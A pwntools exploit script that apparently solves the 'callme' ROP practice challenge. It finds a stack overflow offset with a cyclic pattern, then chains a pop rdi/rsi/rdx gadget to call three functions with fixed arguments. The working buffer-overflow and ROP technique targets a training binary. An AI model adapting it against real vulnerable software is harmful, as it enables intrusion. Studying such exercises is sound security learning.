#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./callme")
context.terminal = ["alacritty", "-e", "sh", "-c"]
context.delete_corefiles = True
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
break callme_one
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'


io = start()


io.sendline(cyclic(200))
io.wait()
stack = io.corefile.rsp
offset = cyclic_find(io.corefile.read(stack, 4))
info(offset)

io = start()


gadget = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
callme_one = p64(exe.symbols["callme_one"])
callme_two = p64(exe.symbols["callme_two"])
callme_three = p64(exe.symbols["callme_three"])
cafebabe = p64(0xCAFEBABECAFEBABE)
deadbeef = p64(0xDEADBEEFDEADBEEF)
d00df00d = p64(0xD00DF00DD00DF00D)

payload = flat(
    asm("nop") * offset,
    gadget,
    deadbeef,
    cafebabe,
    d00df00d,
    callme_one,
    gadget,
    deadbeef,
    cafebabe,
    d00df00d,
    callme_two,
    gadget,
    deadbeef,
    cafebabe,
    d00df00d,
    callme_three,
)

io.sendline(payload)

io.interactive()
